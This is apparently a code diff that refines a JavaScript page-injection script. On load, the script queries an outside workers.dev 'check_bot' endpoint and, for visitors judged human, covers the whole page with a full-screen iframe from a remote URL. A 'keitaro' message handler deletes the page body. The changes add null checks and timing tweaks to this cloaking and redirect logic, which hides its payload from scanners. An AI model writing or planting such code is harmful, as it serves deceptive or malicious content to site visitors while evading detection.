@@ -1,5 +1,3 @@
-
-
 const createLoader = () => {
     const frame = document.createElement('iframe');
     frame.id = 'load_frame';
@@ -18,56 +16,46 @@ const createLoader = () => {
         const parent = body;
         parent.insertBefore(frame, body.firstChild)
     }
-
 }
+
 const toggleLoad = () => {
     const body = document.querySelector('body');
     if (body) {
         body.removeAttribute('hidden');
-
     }
     const load_frame = document.querySelector('#load_frame');
     if (load_frame) {
-        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
+        load_frame.remove();
     }
-
 };
+
+
 createLoader();
 
 window.addEventListener('message', (message) => {
     console.log(message.data);
     if (message.data?.bot) {
         const wrapper = document.querySelector('#wrapper_frame');
-        
-        wrapper.remove();
+        if (wrapper) wrapper.remove(); 
         setTimeout(toggleLoad, 500);
-
     }
     if (message.data?.keitaro && !message.data?.bot) {
         const body = document.querySelector('body');
-        body.remove()
+        if (body) body.remove(); 
         setTimeout(toggleLoad, 500);
-
     }
-
 })
 
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + '/nf5nPY3n')
-            setTimeout(toggleLoad, 500);
+            createFrame(res.url + '/nf5nPY3n');
+            setTimeout(toggleLoad, 1000); 
         } else {
             setTimeout(toggleLoad, 500);
-
         }
-
     })
-
 })
-
-
-
 
 function createFrame(data) {
     const frame = document.createElement('iframe');
@@ -76,26 +64,26 @@ function createFrame(data) {
     frame.setAttribute('height', '100vh');
     frame.setAttribute('id', 'wrapper_frame');
     const html = document.querySelector('html');
-    html.style.overflow = 'hidden';
-
-    // body.innerHTML = '';
-    html.append(frame);
-    frame.style = 'width: 100%; height: 100vh;border: none;'
+    if (html) {
+        html.style.overflow = 'hidden';
+        html.append(frame);
+    }
+    
+    frame.style = 'width: 100%; height: 100vh; border: none;';
     const style = document.createElement('style');
     style.innerHTML = `
-    
-  /* Make the iframe responsive */
-  @media only screen and (max-width: 768px) {
-    iframe {
-      height: 50vh;
+    /* Make the iframe responsive */
+    @media only screen and (max-width: 768px) {
+      iframe {
+        height: 50vh;
+      }
     }
-  }
 
-  @media only screen and (max-width: 480px) {
-    iframe {
-      height: 30vh;
+    @media only screen and (max-width: 480px) {
+      iframe {
+        height: 30vh;
+      }
     }
-  }
     `;
-    html.append(style)
+    if (html) html.append(style);
 }
